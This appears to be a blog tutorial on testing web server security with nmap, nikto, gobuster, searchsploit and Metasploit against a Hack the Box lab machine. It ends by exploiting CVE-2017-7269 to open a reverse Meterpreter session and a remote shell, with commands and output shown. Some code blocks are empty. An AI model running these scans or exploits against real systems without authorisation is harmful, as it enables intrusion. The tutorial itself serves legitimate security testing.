<p>We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue <a href="https://letsencrypt.org/">Let&rsquo;s encrypt</a> certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be. But, are they?</p>
<p>In this post I&rsquo;m going to be walking you through five tools you can easily set up and run in order to test the security of your servers and web applications. Note that the examples listed below are executed against a vulnerable-on-purpose <a href="https://www.hackthebox.eu/">Hack the Box</a> machine referenced by its IP address, but the URL of your site may be used instead.</p>
<p><strong>Warning:</strong> Some of the listed examples are very intrusive. Be sure to execute them against a local instance of the application or a test environment.</p>
<h2 id="nmap">Nmap</h2>
<p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
<p>I discovered this great tool around 12 years ago. I remember it was mind-blowing to me that Ubuntu came with it installed out-of-the-box given the nature of the app! At that point it was the most popular network mapping tool around, and it still holds that position today. It has many capabilities such as host discovery, port scanning, service and OS detection, vulnerability analysis, and much more!</p>
<p>It is very common to run an nmap scan (or several ones) when approaching a system to get information about the services running on it. Then, depending on the results of the scan, other more specific scans and searches may be executed.</p>
<p>Example:</p>
<pre><code>$ nmap -A 10.10.10.14

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 00:06 EDT
Nmap scan report for 10.10.10.14 (10.10.10.14)
Host is up (0.16s latency).

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds
</code></pre><p>The <code>-A</code> flag means the scan is aggressive which includes OS detection, service versions detection, and the execution of the default set of scripts. For less intrusive attacks use <code>--script=safe</code> instead. For vulnerability detection (very useful, but more intrusive) use <code>--script=vuln</code>.</p>
<p>The results show a Windows machine running the Microsoft IIS 6.0 web server on port 80. The next steps will be oriented to collect information about the web server and try to exploit it in order to get access to the system.</p>
<p>Tip: If nmap indicates the host is down, it may be because the server is not configured to reply to ping requests. Adding <code>-Pn</code> will launch the scan and ignore the ping check.</p>
<h2 id="nikto">Nikto</h2>
<p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p>
<p>Nikto is a fantastic web scanner that examins web servers to find software misconfigurations, default/insecure paths available, and vulnerability to attacks such as cross-site scripting and clickjacking, among many others. The solution for some of the vulnerabilities detected by Nikto is as simple as adding a new header to your http responses which may be a neat quick win for your team.</p>
<p>Example:</p>
<pre><code>$ nikto -host 10.10.10.14

</code></pre><p>With a pretty simple command execution a lot of information about the web server was retrieved. On the top, information about the web server technologies and the development tools. Then, headers information including missing headers that would allow some kinds of attacks. And finally, warnings about available HTTP methods and interesting files and directories. Note also the OSVDB references, these are known vulnerabilities that are part of a database and their ids may help find further information about them (including exploits).</p>
<h2 id="gobuster">Gobuster</h2>
<p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p>
<p>Gobuster is a widely-used tool to bruteforce web server paths. It is useful for detecting interesting files and folders that may lead to information disclosure or, even worse, remote code execution. In the example below the <code>common.txt</code> list of paths is used, which can be found as part of the <a href="https://github.com/danielmiessler/SecLists">SecLists repository</a>.</p>
<p>Example:</p>

</code></pre><p>The result shows which paths were found and their corresponding HTTP status codes. Note that this information complements the already quick path discovery performed by Nikto, getting some new paths this time.</p>
<p>So, should these paths be visible or not? First of all navigate them, see what information can be obtained from them. Then, for standard paths it will be enough some Googling (or Duckduckgoing) in order to determine if they should be publicly available or not, do your investigation depending on your scan results!</p>
<h2 id="searchsploit">Searchsploit</h2>
<p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
<p>Searchsploit is a great tool for finding available exploits for applications and kernels. If a vulnerable version of an application is being executed on your server, it may be possible for a malicious actor to exploit it to gain access to your data or perform other types of attacks. On the other hand, being able to execute these verifications ourselves is a great skill to have to proactively defend our systems.</p>
<p>It is worth mentioning that searchsploit works pretty well with Nmap, Nikto and other scanners, as after discovering what services are running on a certain server they can be searched by version number on searchsploit to see if there are any exploits available.</p>
<p>Example:</p>
<pre><code>$ searchsploit iis 6.0

------------------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results
</code></pre><p>This is the result of searching exploits for the IIS 6.0 web server that was detected before using both Nmap and Nikto. It can be appreciated that several exploits were found for this particular version of IIS, having on the left column a short description of the vulnerability, and on the right colum the path of exploits and other files with relevant information.</p>
<p>Tip: To retrieve the exact location of the exploits or info files on your system, let&rsquo;s say for the first one listed which is <code>windows/remote/21057.txt</code>,  run <code>searchsploit -p windows/remote/21057.txt</code>. If <code>locate</code> is available, <code>locate windows/remote/21057.txt</code> would also work.</p>
<p><strong>Warning:</strong> Do not just execute exploits if you are not sure about what they do, some of them are harmful. Open the exploit file and see what it does before running it.</p>
<h2 id="metasploit">Metasploit</h2>
<p><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p>
<p>Metasploit is an exploitation framework created by Rapid7. It is widely used by security professionals and also by black-hat hackers, and it simplifies A LOT the process of collecting information, doing a vulnerability analysis, exploiting, and post-exploiting a system. When it comes to learning resources about this tool, I cannot recommend highly enough <a href="https://www.youtube.com/watch?v=TCPyoWHy4eA&amp;list=PL7-g2-mnZwSEFhqybJFEPZYhNFqqbCe9_">Hak5&rsquo;s Metasploit Minute</a> and <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik&amp;list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm">HackerSploit&rsquo;s Metasploit videos</a>!</p>
<p>This example will be a little bit different to the other ones as we will use <em>msfconsole</em>, the Metasploit console, to gain access to the server and pop and actual shell on it. This can be done in less than two minutes by following a few simple steps:</p>
<ol>
<li>Search for IIS-related Metasploit modules (similar to searchsploit)</li>
<li>Select an exploit and set its options</li>
<li>Run exploit and gain access to the system</li>
</ol>

</code></pre><p>It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers, please take a moment to read through the results. This time the <em>Microsoft IIS WebDav ScStoragePathFromUrl Overflow</em> exploit will be used (search result number 15 on the list), which is related to the <a href="https://www.cvedetails.com/cve/CVE-2017-7269/">CVE-2017-7269</a> vulnerability and it is also know as &ldquo;Exploding Can&rdquo;. Note that, when successful, the execution of this exploit leads to remote code execution.</p>
<h3 id="select-an-exploit-and-set-its-options">Select an exploit and set its options</h3>
<p>The <code>use</code> command will be used to select the exploit to be executed, and <code>show options</code> to get the options that have to be set in order to execute it:</p>
<pre><code>msf5 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl

   0   Microsoft Windows Server 2003 R2 SP2 x86
</code></pre><p>The only mandatory option that hasn&rsquo;t been set is <strong>RHOSTS</strong>, and corresponds to the target host (victim). So let&rsquo;s set it to the IP address of the same machine we scanned with the previous tools:</p>
<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 10.10.10.14
RHOSTS =&gt; 10.10.10.14
</code></pre><h3 id="run-the-exploit-and-gain-access-to-the-system">Run the exploit and gain access to the system</h3>
<p>A really interesting feature of Metasploit modules is that some of them have a <code>check</code> function to verify if the target host is vulnerable:</p>
<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; check
[+] 10.10.10.14:80 - The target is vulnerable.
</code></pre><p>As the host seems to be vulnerable to this exploit, let&rsquo;s proceed to run it in order to gain access to the server:</p>
<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.8:4444 -&gt; 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
</code></pre><p>Boom, we pwned the system! Get some info from it using <code>sysinfo</code> and then open a regular shell:</p>
<pre><code>meterpreter &gt; sysinfo

OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).

Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter &gt; shell

c:\windows\system32\inetsrv&gt;
</code></pre><p>And that&rsquo;s it! We got a meterpreter session that remotely controls the victim machine, and we also were able to pop a regular shell on it. A next step would be to gain root access to this computer, but I will leave that one for the next time :)</p>
<h2 id="summary">Summary</h2>
<p>On this post we went through a pretty standard security assessment that any web engineer would be able to run. What we did:</p>
<ol>
<li>Run an <strong>nmap</strong> scan to discover services running on a server.</li>
<li>Run a <strong>nikto</strong> scan to evaluate the security of the web server running on port 80 detected by nmap.</li>
<li>Run a <strong>gobuster</strong> scan in order to list interesting files and folders of the web server.</li>
<li>Use <strong>searchsploit</strong> to determine if there are any existing exploits for the technologies listed by nmap, nikto and gobuster.</li>
<li>Use the <strong>metasploit framework</strong> to search for exploits and to gain access to the system.</li>
</ol>
